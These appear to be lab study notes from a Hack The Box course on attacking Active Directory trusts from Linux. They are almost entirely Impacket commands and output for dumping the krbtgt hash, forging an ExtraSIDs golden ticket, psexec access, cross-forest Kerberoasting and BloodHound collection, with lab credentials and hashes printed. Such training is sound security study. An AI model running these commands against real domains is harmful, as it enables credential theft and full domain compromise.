# Attacking Domain Trusts from Linux

## Child to Parent (ExtraSIDs Attack)

### Automated Method

```sh
htb-student@ea-attack01:~$ raiseChild.py -target-exec 172.16.5.5 'LOGISTICS.INLANEFREIGHT.LOCAL'/'htb-student_adm':'HTB_@cademy_stdnt_admin!'
```

### Manual Method

#### KRBTGT Hash (LOGISTICS)

```sh
htb-student@ea-attack01:~$ secretsdump.py 'LOGISTICS.INLANEFREIGHT.LOCAL'/'htb-student_adm':'HTB_@cademy_stdnt_admin!'@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

```output title="Output" hl_lines="3"
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
```

#### SID (LOGISTICS)

```sh
htb-student@ea-attack01:~$ lookupsid.py 'LOGISTICS.INLANEFREIGHT.LOCAL'/'htb-student_adm':'HTB_@cademy_stdnt_admin!'@172.16.5.240
```

```output title="Output" hl_lines="3"
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
513: LOGISTICS\Domain Users (SidTypeGroup)
514: LOGISTICS\Domain Guests (SidTypeGroup)
515: LOGISTICS\Domain Computers (SidTypeGroup)
516: LOGISTICS\Domain Controllers (SidTypeGroup)
517: LOGISTICS\Cert Publishers (SidTypeAlias)
520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
525: LOGISTICS\Protected Users (SidTypeGroup)
526: LOGISTICS\Key Admins (SidTypeGroup)
553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
1001: LOGISTICS\lab_adm (SidTypeUser)
1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
1103: LOGISTICS\DnsAdmins (SidTypeAlias)
1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
1106: LOGISTICS\htb-student_adm (SidTypeUser)
```

#### SID (Enterprise Admins of INLANEFREIGHT)

```sh
htb-student@ea-attack01:~$ lookupsid.py 'LOGISTICS.INLANEFREIGHT.LOCAL'/'htb-student_adm':'HTB_@cademy_stdnt_admin!'@172.16.5.5 | grep 'Enterprise Admins'
```

```output title="Output"
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

#### Golden Ticket

```sh
htb-student@ea-attack01:~$ ticketer.py hacker -nthash 9D765B482771505CBE97411065964D5F -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519
```

```output title="Output" hl_lines="12"
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in hacker.ccache
```

#### Using the Ticket

```sh
htb-student@ea-attack01:~$ export KRB5CCNAME='hacker.ccache'
htb-student@ea-attack01:~$ psexec.py 'LOGISTICS.INLANEFREIGHT.LOCAL'/'hacker'@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -target-ip 172.16.5.5 -k -no-pass
```

## Cross-Forest (Bidirectional or Inbound Trust)

### Enumeration

```sh
htb-student@ea-attack01:~$ GetUserSPNs.py 'INLANEFREIGHT.LOCAL'/'wley':'transporter@4' -target-domain FREIGHTLOGISTICS.LOCAL
```

```output title="Output"
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>
```

### Kerberoasting

```sh
htb-student@ea-attack01:~$ GetUserSPNs.py 'INLANEFREIGHT.LOCAL'/'wley':'transporter@4' -target-domain FREIGHTLOGISTICS.LOCAL -request
```

```output title="Output" hl_lines="8-9"
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>



$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$0ee0bcfdb919810670ba70e48952d2f8$c71f77513393eb923f79e14d7d2573e364e35ef753b1e84d3daab01126b93c638a5b4e1624fcea381225cefae1f98cf4b1ea48efce104c805cdff67c756643e9209bc20b302130204d1b4955df419c61c3c6b6eeb14fdc219311fe12d822e42ef5ff6b782afca4d0919fda6c51d6827dd113fd0f98f0e415039a0ba61fb359141ce3ebf8a16ad6089986c9264310c0c884c12bd08fb4cb5d5c209106b6ac3d445d1d46b187e7e000e51c74fb957c67afbec0358ca349ca27b69c3f3c186fed017b7819cdb6e85be70c8930cef95b06886cf309828c52b63a615681e90de81eaaa0e3e17e234917fce9a855cd9e3ce1ae0b407dbee366106eee94e44db5fc42b000e385ead6d64b0e8385b88fe566ebd37993e8a7ab95c15c2b0aa9af4ab5053192f81805caf4593203bf16338365538a805cd59fea7771e5cfeb44aff06fc5df8b6b828b97d9140656b5cec870e84fd3ec24d22295f40f46bcb813165a72e20719419a05e27d53ef4a917032a016554ccc5c7a7d85b5da259cbbe4670eaae364225be543301dae89318372d126e93cd0774834aec62ab22bcfe8b28af15cab2aafea689ac9e5607e2664a8c9c31512f351cf0a425b2fd05767a847790e4ba9d6060f460b81e3ad3d70894f79188e611a098052136c6c76b5bffd926348f815f1e4e6e5fcbfed22041e6874ba5e5cd9286896b2561b4de463a3120d08bf0e619e625bf4d4516ad855e53f5ce952ab5c36d5f95fe082199028e705d47bd9abe15c07c984ef5eec844988f7f015d40e8373a51a49a79ee30bf4d83b417f8c05e3d859b80ed34a88a819609cfed0eec42bd5d5c3e75e990378c289232ad84f0d5376794e5718741a82b0b377c109ca15871e91aff283bedfa48885fafc7efff10590a503b11cbad033c5c22f95bade2fb944cd2c585a404a4f188c8a094615c64438f8e3f8c0af33b407fb79992a5b318085020a9e7e7e5714f689da36fa5fd4546cd0893d976c5c79cced0a9b41db3398071668760276a0b6e7ec6c267c53f2d31bdcb70105b4efbdc2aec987ac9a5d50336202fafb4b7bd77ee6ff772ba600e76dffea4308879e568fc30b43971761bb8e763cd90e719932d38908e42561a51024ece07a66117a1f0e70ee579620e9cd2332bfcc1de3c9c7592bf0abebcff1ddff182744d3e15befb00e6bc751702ba3ee83c199adb44c3549b200f784fd05ce191493952b7abdcb524b30ebc9fa1191de08666bfbf0278fe308be45fb2a2faa5280cccf34a961bf1cb2e885ea9b937506ed6a97528d07fd7699a77a51598e78dc70753a198d44b6f48c97e90451b1dc2e4b6d1ed8fed83eb8752c4696788ccab49c31a783d8ff61c3c76bf52bf7ce7d7a2ed5a025f2ea146e7c9d1b1e4da4abddc4673f93b7ed32a4c0c43511b453c06f786a69812b54cb9406a75777c03de59a37d64bbec9617356
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$e788bbce0367edd30755467998153e41$2514daf30018d60bb7b58c92f0f119e4cbe87b82c514fb852b0ff76ee8f806f4eaa081b8529cb6f3627639d9e0236496bf6c918d34741bc58e5be6dee04a5a9902c1b087eff8f35f3a512ed418a6f717b2231a8479267d11de1038351e47a76ebbc91cde91842070d3ccfc3b1dca572db3cdf07735a60a383c1edb324d21fbdf25f856ac66f50f887a7a1d47adcdc8e1935f8b39800f6b34815e0a59f27eb458b6c22cfef57e298f1c366675ce519a77af9d47e58e347e14d162b4ca999b8e93790da3654a6008a59d8c040c8e3714fe6d2a42c102f1f70e5ffbd3e9712670af2c5d2fd47b74ea0098b91532a1d53f640c26338f91ba3f14253c6652f6a52ab4fac4bf772502ed220afea2c2e453103a8b6427c8e6f500b5fdcd90191340688ded4485d532e67e8eefe48aeb20a9e034da5c34d17d812f0f45850a6238c1b7029e30ffcf67a5add69a19b0a78489c88aa3a0afedc6b595919d1bef56c510eacaba88af5bc5c52a7f585f6ef2e2676dc509dc1f5fcf1bb9167c293ffcd557ac38d245695ce466e3ac095c0f770da68f5874b109cd8b5dcecea0095fa72ef39acf7b19fdfd59278b19154da38703bdb2e2b27d4fc06e55cea7bfed3e3e1b89368dd862a53304d81f37cfba0e96b3ea84c97c200c177f305146a856ad74d75bcb148dcdbad051c13090185ca8c904d6389625e6be49348a132f9958c4c8668956f3c4deb5438cc7a47c933b6688da80f514db98784bf5bf12208d80b39a3e14d82fd3f34c3b0e85555d10b03e18284303fa1a8fa2135a45c121743d22f8e2ba6d0324d94c9d9d42c527f5f6a470a8e99ec96ea37cef0192d5bf8330d3ddebbda2a49dc7340ab78d5dc156a247695994a30ea90dfc0f36772419e7ab11a0b8be55cea11636c3720f3e683c819c573c0fa51ff03f52335220e6fc3b27e901bd115c9dfcf5ba4959504be5d5481e2f11b4a3fba0521565b79352d264eac5490f3217906154f7272df23d8a9128edff05064bd9790c4dc7a949f855b74270fb4b6cda3c591feca431cc8707534295bf8b92b654a658076cd0d756ff3e0727019a1a84f62d7ae251e03662254fe9e31ab9f3a56172603de27d1ce4e3b134f397f24a2d2d763ad530b8d92cdbdc55aab21ceee266c1c64c21249575e89b81b534597b6f620d5c0c2a7d6c72da4a988418c7deb0ba023f6a4d9c24dfa181249d6ab43986c452dd367b8b9490cd32e7918991ffb0d49b3052d9af1d1db2574f800977577c1d4b02b5abbf5f9336b91670465f95fa3a785c5303ce318c1671474546a8553facfe8f286dcd184bed33780e9a4ae4782f58d18f8b050c5636362e43079a0a8a74bcbf414f5b398a9aed9910baf0cbb5f5be848a7c8a8af2ef8dde2851d0c2803704e66aa4c3d6fdb06cba8063b0a1f6d449cfb9102182a5bbfa8b7a1faa62b25ae1e0c934b5c3a260
```

## Foreign Domain Group Membership

### INLANEFREIGHT (DNS Configuration)

```text title="/etc/resolv.conf" linenums="1" hl_lines="8-9"
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

### INLANEFREIGHT (BloodHound)

```sh
htb-student@ea-attack01:~$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -u 'forend@inlanefreight.local' -p 'Klmcargo2'
```

### FREIGHTLOGISTICS (DNS Configuration)

```text title="/etc/resolv.conf" linenums="1" hl_lines="8-9"
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

### FREIGHTLOGISTICS (BloodHound)

```sh
htb-student@ea-attack01:~$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -u 'foren@inlanefreight.local' -p 'Klmcargo2'
```
